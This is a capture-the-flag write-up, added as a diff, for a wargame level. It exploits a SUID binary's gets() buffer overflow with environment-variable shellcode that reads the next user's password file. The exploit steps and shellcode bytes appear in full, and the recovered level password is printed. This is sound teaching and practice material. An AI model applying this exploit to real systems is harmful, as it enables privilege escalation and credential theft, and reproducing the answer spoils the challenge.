@@ -1,1 +1,172 @@
-hello flag
+# Level04 — Fork-Based Buffer Overflow & Environment Variable Exploitation
+
+## Context
+
+Inside the home directory of the `level04` user, we find a binary named `level04`.
+The program implements a fork-based architecture with anti-debugging measures and uses the vulnerable `gets()` function.
+Our objective is to exploit a buffer overflow vulnerability in the child process to execute shellcode stored in an environment variable.
+
+---
+
+## Initial Environment — Directory Listing
+
+```bash
+$ ls -la
+total 17
+dr-xr-x---+ 1 level05 level05   80 Oct  2  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
+-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
+```
+
+> **Note:** the binary `level04` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`level05`).
+
+---
+
+## Security Analysis
+
+```bash
+$ checksec --file level04
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level04
+```
+
+**Key security features:**
+* **No stack canary** → Stack buffer overflow protection is disabled
+* **NX disabled** → Stack is executable (shellcode execution possible)
+* **No PIE** → Predictable memory addresses
+* **No ASLR** → Memory layout is consistent across runs
+
+---
+
+## Running the Binary
+
+```bash
+$ ./level04
+Give me some shellcode, k
+test input
+child is exiting...
+```
+
+The program prompts for input, processes it, and exits with a "child is exiting" message.
+
+---
+
+## Static Analysis (Disassembly)
+
+**Program Architecture Analysis:**
+
+### Fork Operation
+```asm
+0x080486d6 <+14>:    call   0x8048550 <fork@plt>
+0x080486db <+19>:    mov    %eax,0xac(%esp)
+0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
+0x08048711 <+73>:    jne    0x8048769 <main+161>
+```
+
+### Child Process (PID = 0)
+```asm
+0x08048713 <+75>:    movl   $0x1,0x4(%esp)    ; PR_SET_DUMPABLE
+0x0804871b <+83>:    movl   $0x1,(%esp)       ; Enable core dumps
+0x08048722 <+90>:    call   0x8048540 <prctl@plt>
+
+0x08048746 <+126>:   call   0x8048570 <ptrace@plt>  ; Anti-debugging
+0x0804874b <+131>:   movl   $0x8048903,(%esp)       ; "Give me some shellcode, k"
+0x08048757 <+143>:   lea    0x20(%esp),%eax          ; Buffer at esp+0x20
+0x0804875e <+150>:   call   0x80484b0 <gets@plt>    ; VULNERABLE GETS!
+```
+
+### Parent Process (PID > 0)
+```asm
+0x08048769 <+161>:   lea    0x1c(%esp),%eax
+0x08048770 <+168>:   call   0x80484f0 <wait@plt>    ; Wait for child
+```
+
+**Critical observations:**
+* Child process uses `gets()` with buffer at `esp+0x20`
+* Anti-debugging protection via `ptrace()`
+* Parent monitors child for crashes and signals
+
+---
+
+## Vulnerability Analysis
+
+### Buffer Overflow in Child Process
+
+Testing with cyclic pattern to determine overflow offset:
+
+```bash
+(gdb) set follow-fork-mode child
+(gdb) run
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ab9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41326641 in ?? ()
+```
+
+**Pattern Analysis:**
+* Crash at `0x41326641` → corresponds to "Af2A" in cyclic pattern
+* **Buffer overflow offset:** 156 bytes to reach return address
+
+---
+
+## Exploitation Strategy
+
+### Step 1: Environment Variable Shellcode Storage
+
+Since NX is disabled, we can store shellcode in an environment variable and execute it:
+
+```bash
+$ export SHELL=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
+```
+
+**Shellcode Analysis:**
+* Custom shellcode to read and display `/home/users/level05/.pass`
+* Includes file operations: open, read, write to stdout
+* Embedded file path at the end of shellcode
+
+### Step 2: Environment Variable Address Discovery
+
+Create a helper program to find the environment variable address:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    printf("%p\n", getenv("SHELL"));
+    return 0;
+}
+```
+
+```bash
+$ gcc -m32 helper.c -o helper
+$ ./helper
+0xffffd8da
+```
+
+### Step 3: Return Address Overwrite
+
+**Payload Construction:**
+```
+PADDING (156 bytes) + ENVIRONMENT_ADDRESS
+```
+
+---
+
+## Exploitation
+
+```bash
+$ (python -c 'print "A" * 156 + "\xda\xd8\xff\xff"') | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
+```
+
+**Result:** Successfully extracted the level05 password!
+
+---
